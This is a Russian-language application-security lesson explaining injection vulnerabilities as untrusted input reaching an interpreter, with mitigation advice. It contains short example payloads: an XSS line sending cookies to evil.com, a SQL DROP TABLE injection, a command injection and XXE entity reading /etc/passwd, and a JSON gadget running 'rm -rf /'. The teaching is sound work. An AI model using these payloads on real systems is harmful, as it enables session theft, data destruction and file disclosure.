# Интерпретаторы — объединяющая концепция в AppSec

> Почему понимание интерпретаторов — ключ к пониманию большинства уязвимостей веб-приложений.

---

## Проблема: уязвимости выглядят несвязанными

Когда изучаешь OWASP Top 10, кажется, что это просто список несвязанных проблем:

- SQL Injection — про базы данных
- XSS — про браузер
- SSRF — про HTTP
- Command Injection — про shell
- XXE — про XML
- Insecure Deserialization — про объекты

Но если посмотреть внимательнее, **все эти уязвимости следуют одному и тому же шаблону**.

---

## Что такое интерпретатор

**Интерпретатор** — это программа, которая читает данные (входные) и **выполняет инструкции**, содержащиеся в этих данных.

У интерпретатора есть язык — набор инструкций, которые он понимает.

```
Входные данные (Input)
  ↓
Интерпретатор (Interpreter)
  ↓
Выполнение инструкций
```

Примеры интерпретаторов:

| Интерпретатор | Что делает | Язык |
|--------------|-----------|------|
| **SQL-парсер** | Выполняет SQL-запросы | SQL |
| **JavaScript-движок** | Выполняет JavaScript | JavaScript |
| **Shell** | Выполняет команды ОС | Shell |
| **XML-парсер** | Обрабатывает XML-документы | XML (DTD, XPath, XSLT) |
| **Java Deserializer** | Восстанавливает объекты | Java Serialization |
| **pickle (Python)** | Восстанавливает объекты | Python pickle |
| **PHP unserialize** | Восстанавливает объекты | PHP Serialization |

---

## Ключевой шаблон уязвимости

Практически все уязвимости из OWASP Top 10 (и не только) следуют одному шаблону:

> **Приложение передаёт пользовательский ввод интерпретатору, который выполняет инструкции.**

```
Пользовательский ввод
  ↓
Интерпретатор (SQL/JS/Shell/XML/Object)
  ↓
Выполнение нежелательных инструкций
```

### Разбор на примерах

#### SQL Injection

```sql
-- Приложение строит запрос:
"SELECT * FROM users WHERE id = " + userInput

-- Пользователь вводит:
1 OR 1=1; DROP TABLE users--

-- Интерпретатор SQL выполняет:
SELECT * FROM users WHERE id = 1 OR 1=1; DROP TABLE users--
```

Пользовательские данные стали частью **инструкций SQL**, а не просто данными.

#### XSS

```javascript
// Приложение вставляет пользовательский ввод в HTML:
element.innerHTML = userInput;

// Пользователь вводит:
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">

// JavaScript-интерпретатор браузера выполняет эту инструкцию
```

#### Command Injection

```bash
# Приложение вызывает shell:
system("ping " + userInput);

# Пользователь вводит:
8.8.8.8; cat /etc/passwd

# Shell выполняет:
ping 8.8.8.8; cat /etc/passwd
```

#### XXE

```xml
<!-- XML-парсер обрабатывает пользовательский XML -->
<root>&externalEntity;</root>

<!-- Пользователь определяет сущность, которая читает файл: -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

#### Insecure Deserialization

```java
// Java Deserializer восстанавливает объект из пользовательских байтов:
ObjectInputStream in = new ObjectInputStream(request.getInputStream());
Object obj = in.readObject();

// Если среди библиотек есть подходящий класс, злоумышленник
// может заставить интерпретатор выполнить код
```

---

## Почему это важно понять

Когда вы видите **конкретную** уязвимость (например, SQL Injection), вы помните, что нужно экранировать запросы.

Но когда вы видите **абстрактный** шаблон «интерпретатор + пользовательский ввод», вы начинаете замечать уязвимости, которых раньше не видели.

### Примеры менее очевидных инъекций

| Технология | Интерпретатор | Что происходит |
|------------|--------------|----------------|
| **LDAP** | LDAP-сервер | LDAP Injection |
| **NoSQL (MongoDB)** | JavaScript / MongoDB Query | NoSQL Injection |
| **Template Engine (Jinja2, Freemarker)** | Template Engine | SSTI (Server-Side Template Injection) |
| **XPath** | XML Parser | XPath Injection |
| **ORM (Hibernate, Doctrine)** | ORM / SQL | HQL Injection, OGNL Injection |
| **Logging (Log4j)** | Log4j Lookup | Log4Shell (CVE-2021-44228) |
| **PDF Generation** | PDF Library | Server-Side PDF Injection |
| **SSI (Server-Side Includes)** | Web Server | SSI Injection |

---

## Чем отличаются языки по степени опасности

Не все интерпретаторы одинаково опасны. Ключевой вопрос:

> **Насколько «умным» является интерпретатор?**

### Пример: «глупые» интерпретаторы

```go
// Go json.Unmarshal — просто заполняет поля структуры
var user User
err := json.Unmarshal(jsonData, &user)
// Нет: выполнения кода, вызова методов, создания произвольных типов
```

```rust
// Rust serde_json — просто создаёт структуру
let user: User = serde_json::from_str(json_data)?;
// Только поля, никакой магии
```

Эти интерпретаторы **не умеют выполнять код**. Они просто преобразуют данные.

### Пример: «умные» интерпретаторы

```java
// Java ObjectInputStream — может восстановить ЛЮБОЙ объект
Object obj = ois.readObject();  // вызывает методы класса
```

```python
# Python pickle — может выполнить произвольный код
pickle.loads(data)  # вызывает __reduce__ и другие методы
```

```php
// PHP unserialize — вызывает магические методы
unserialize($data);  // вызывает __wakeup, __destruct, __toString
```

Эти интерпретаторы **могут выполнять код** в процессе восстановления данных.

### Шкала опасности

```
Безопаснее ←——————————————————————————→ Опаснее

Json.Unmarshal (Go)     Java ObjectInputStream
serde_json (Rust)       Python pickle
JSON.parse (JS)         PHP unserialize
json.loads (Python)     Ruby Marshal.load
                        .NET BinaryFormatter
                        
Просто данные            Может выполнить код
```

---

## Почему JSON — золотой стандарт безопасности

JSON — это формат данных, **а не язык программирования**.

JSON говорит:
> `name = "Alex"`, `age = 30`

JSON **не говорит**:
> Создай объект этого класса, вызови этот конструктор, выполни этот метод

В JSON нет инструкций. Только данные.

```
JSON = Данные
Java Serialization / pickle / PHP unserialize = Данные + Инструкции
```

### Когда JSON становится опасным

Разработчик может **добавить инструкции** в JSON:

```json
{ "@class": "java.lang.Runtime", "command": "rm -rf /" }
```

Это уже не просто данные. Это данные + инструкция «создай объект указанного класса».

Такое возможно, если библиотека (Jackson, Fastjson) поддерживает полиморфную десериализацию и разработчик её включил.

---

## Обобщающая модель: Unvalidated Input + Interpreter = Vulnerability

```
Unvalidated User Input
       +
  Powerful Interpreter
       =
    Vulnerability
```

### Как защищаться

Для каждой точки, где пользовательский ввод встречается с интерпретатором:

1. **Не использовать мощные интерпретаторы** для пользовательских данных, если можно обойтись простыми (JSON вместо Java Serialization)

2. **Разделять данные и инструкции** (параметризованные запросы вместо конкатенации)

3. **Валидировать и санировать ввод** перед передачей интерпретатору

4. **Ограничивать возможности интерпретатора** (минимальные привилегии, disable dangerous features)

---

## Это объясняет не только OWASP Top 10

Понимание шаблона «интерпретатор + ввод» помогает анализировать новые уязвимости:

- **Log4Shell (CVE-2021-44228):** Log4j — интерпретатор JNDI lookup. Пользовательский ввод попал в лог, Log4j выполнил JNDI-запрос.
- **Shellshock (CVE-2014-6271):** Bash — интерпретатор. Пользовательский ввод в переменной окружения привёл к выполнению команд.
- **CVE в ImageMagick:** ImageMagick — интерпретатор ImageMagick Vector Language. Пользовательское изображение содержало инструкции для SSRF/RCE.
- **SSTI (Server-Side Template Injection):** Template Engine — интерпретатор шаблонов. Пользовательский ввод стал частью шаблона.

---

## Что запомнить (коротко)

1. **Интерпретатор** — программа, которая выполняет инструкции из входных данных
2. **Большинство уязвимостей** возникают, когда пользовательский ввод попадает в интерпретатор без проверки
3. **SQL, JS, Shell, XML, Object Deserializer, Template Engine** — всё это интерпретаторы
4. **JSON безопасен** — это данные без инструкций. Но может стать опасным, если добавить инструкции (`@class`)
5. **Общий шаблон:** Unvalidated Input + Powerful Interpreter = Vulnerability
6. **Золотое правило:** не давайте пользователю управлять тем, *что* будет делать интерпретатор

---

## Связь с темами курса

| Тема | Интерпретатор |
|------|--------------|
| SQL Injection | SQL-парзер |
| XSS | JavaScript-движок браузера |
| Command Injection | Shell (bash, sh, cmd) |
| XXE | XML-парсер (DTD) |
| Insecure Deserialization | Object Deserializer (Java, Python pickle, PHP unserialize) |
| SSTI | Template Engine (Jinja2, Freemarker, Twig) |
| Log4Shell | Log4j JNDI Lookup |
| NoSQL Injection | MongoDB / Query Engine |

---

>  **Совет:** Если вы встретили новую уязвимость, задайте себе два вопроса:
> 1. Какой интерпретатор здесь участвует?
> 2. Контролирует ли пользователь часть инструкций для этого интерпретатора?
>
> Если ответы «да» и «да» — вы нашли суть проблемы.
